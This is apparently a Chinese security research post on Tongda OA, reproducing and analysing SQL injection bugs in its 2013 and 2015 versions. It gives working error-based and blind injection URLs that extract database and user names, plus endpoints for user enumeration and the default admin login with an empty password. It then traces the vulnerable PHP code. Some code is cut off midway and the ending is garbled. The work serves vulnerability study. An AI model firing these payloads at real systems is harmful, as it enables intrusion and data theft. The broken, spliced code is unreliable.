**(这是写完这篇文章之后在这里补充的，我觉得，如果真的感兴趣，一定要看看2017那个SQL注入，简简单单的一个@和`'`，里面是真的细，惊到我了)**
## (一) 前言
通达OA（Office
Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。
这里感谢[jdr](https://xz.aliyun.com/u/39449)师傅前面整理的通达OA一些版本的漏洞复现，这里从漏洞点出发，分析漏洞，从中学些一些师傅白盒挖掘漏洞的思路。  
​
安装包下载地址从网上的文章发现基本有2种，可以通过枚举版本号下载对应的安装包：
    https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe
    https://www.tongda2000.com/download/down.php?VERSION=2019&code=
也可以从我整理好的百度网盘下载：
    链接: https://pan.baidu.com/s/16Ie3yegEjdb--jabA0Zsxg 提取码: 4g6i
安装教程为傻瓜式一键安装，这里不细说。  
默认账号密码admin/(空)  
代码解密使用在线工具：
## (二) 信息收集
### 一、版本信息
    /inc/expired.php
    /inc/reg_trial.php
    /inc/reg_trial_submit.php
### 二、计算机名
需要高于2013版本
    /resque/worker.php
### 三、用户名&邮箱枚举
需要高于2013版本  
​
    /ispirit/retrieve_pwd.php?username=要枚举的用户
存在的用户  
不存在的用户  
## (三) 通达OA2013
### 一、/interface/ugo.php 报错注入
#### 漏洞复现
    /interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271
#### 漏洞分析
1、首先定位到漏洞点/interface/ugo.php  
使用函数urldecode解析$OA_USER，这也是为什么单引号使用 **%2527** 的原因  
然后下面调用ext_login_check方法处理$OA_USER  
2、全局搜索ext_login_check，在第16、17行看到直接拼接并调用方法exequery执行  
3、exequery方法是这样定位的：  
首先ugo.php包含了inc/session.php文件  
session.php文件包含了inc/conn.php文件  
在conn.php文件中就看到了exequery方法  
4、前面简单处理了union select和info outfile和into dumpfile
    if (!$LOG) {
            $POS = stripos($Q, "union");
            if ($POS !== FALSE && stripos($Q, "select", $POS) !== FALSE) {
                exit;
            }
            $POS = stripos($Q, "into");
            if ($POS !== FALSE && (stripos($Q, "outfile", $POS) !== FALSE || stripos($Q, "dumpfile", $POS) !== FALSE)) {
                exit;
            }
        }
5、在这里执行了sql语句  
​
### 二、/interface/auth.php 报错注入
#### 漏洞复现
这个复现是jdr师傅之前复现的，现在因为没有搞到更老版本的安装包，就直接用了，思路还是比较简单的。
    /interface/auth.php?&PASSWORD=1&USER_ID=%df%27 and (select 1 from (select count(*),concat((select concat(0x3a,(select database()) ,0x3a) from user limit 1),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23
#### 漏洞分析
1、根据URL定位漏洞点/interface/auth.php  
2、关键代码截取下来了，很明显这里加了过滤，将一些字符替换为空，所以无法利用。
    //替换为空
    $USER_ID = str_replace(array(",", "\\\"", "\\'", "\"", "'", "\t", "\\", "\\\\"), array("", "", "", "", "", "", "", ""), $USER_ID);
    //检测传参是否非空，空的话exit
    if ($USER_ID == "" || $PASSWORD == "") {
        message("", _("»¥Áª»¥Í¨·ÃÎÊ½Ó¿ÚµÄÓÃ»§Ãû»òÃÜÂëÓÐÎó"));
        exit;
    }
    //直接拼接USER_ID
    $query = "select * from EXT_USER where USER_ID='" . $USER_ID . "'";
    //调用exequery执行
    $cursor = exequery($connection, $query);
### 三、/interface/go.php 报错注入
#### 漏洞复现
emm。。同上，我这里已经无法复现了
    interface/go.php?APP_UNIT=a%2527 and 1=(select 1 from(select count(*),concat(database(),0x7c,user(),0x7c,floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a) and %25271%2527=%25271
#### 漏洞分析
1、根据URL定位漏洞点/interface/go.php  
2、OA_USER和APP_UNIT都进行了过滤
    //过滤单引号等字符，替换为空
    $OA_USER = str_replace(array(",", "\\\"", "\\'", "\"", "'", "\t", "\\", "\\\\"), array("", "", "", "", "", "", "", ""), $OA_USER);
    $APP_UNIT = str_replace(array(",", "\\\"", "\\'", "\"", "'", "\t", "\\", "\\\\"), array("", "", "", "", "", "", "", ""), $APP_UNIT);
    //直接拼接APP_UNIT
    $query = "select MEMBER_ID from CONNECT_CONFIG where MEMBER_NAME='" . $APP_UNIT . "'";
    //调用exequery方法执行
    $cursor = exequery($connection, $query);
3、jdr师傅是复现了APP_UNIT参数的SQL注入，然后这里往下看，可以看到OA_USER与/interface/ugo.php中的一样，在下面调用了ext_login_check方法
    if ($OA_USER == "admin") {
        echo _("¸ÃÕÊºÅÎÞÈ¨·ÃÎÊ");
        exit;
    }
    session_start();
    ob_start();
    if ($LOGIN_USER_ID != $OA_USER) {
        include_once "./auth.php";
        $result = ext_login_check($OA_USER);
        if ($result != "1") {
            echo $result;
            exit;
        }
    }
而ext_login_check方法是没有过滤的，所以，理论上，旧版本在/interface/go.php?OA_USER=应该也会有注入。  
## (四) 通达OA2015
### 一、/ispirit/retrieve_pwd.php 盲注
#### 漏洞复现
1、判断是否存在注入
    /ispirit/retrieve_pwd.php?_GET[username]=admin'or 1=1 and'a'='a
2、判断数据库长度为5
    /ispirit/retrieve_pwd.php?_GET[username]=admin' or if((length(database())=5),1,power(88888,88)) and'a'='a
3、判断数据库是否为td_oa
    /ispirit/retrieve_pwd.php?_GET[username]=admin'or if((database()='td_oa'),1,power(888888,88))and'a'='a
#### 漏洞分析
这里代码没找到旧版本的，就理性分析一下。  
1、根据URL定位漏洞点/ispirit/retrieve_pwd.php  
2、前面看到请求了2个参数username和email，然后username直接拼接
    " . _("SQL") . " " . $Q, $LOG);
        }
        return $cursor;
    }
5、然后看db_query方法，第一行就调用sql_injection进行了检测是否存在SQL注入。往下可以看到还有一些其他检测如select和set的，这里推测应该是在一定基础上进行了一次绕过，然后就直接加了sql_injection方法在前面。
    function db_query($Q, $C, $QUERY_MASTER = false)
    {
        sql_injection($Q, "'");
        if (MYOA_DB_USE_REPLICATION && ($QUERY_MASTER || strtolower(substr(ltrim($Q), 0, 6)) != "select" && strtolower(substr(ltrim($Q), 0, 3)) != "set")) {
            if ($C == TD::$_res_conn && $C != TD::$_res_conn_master) {
                if (!is_resource(TD::$_res_conn_master)) {
                    TD::$_res_conn_master = openconnection(TD::$_arr_db_master, TD::$_arr_db_master["db"]);
                }
                $C = TD::$_res_conn_master;
            } else {
                if ($C == TD::$_res_conn_crscell && $C != TD::$_res_conn_crscell_master) {
                    if (!is_resource(TD::$_res_conn_crscell_master)) {
                        TD::$_res_conn_crscell_master = openconnection(TD::$_arr_db_master, TD::$_arr_db_master["db_crscell"]);
                    }
                    $C = TD::$_res_conn_crscell_master;
                }
            }
        }
        return @mysql_query($Q, $C);
    }
6、跟进到sql_injection方法，代码有点长，其实就是进行了黑名单校验。  
    $clean = trim(strtolower(preg_replace(array("~\\s+~s"), array(" "), $clean)));
    if (strpos($clean, "union") !== false && preg_match("~(^|[^a-z])union(\$|[^[a-z])~s", $clean) != 0) {
    if (2 load->helper('td_doc');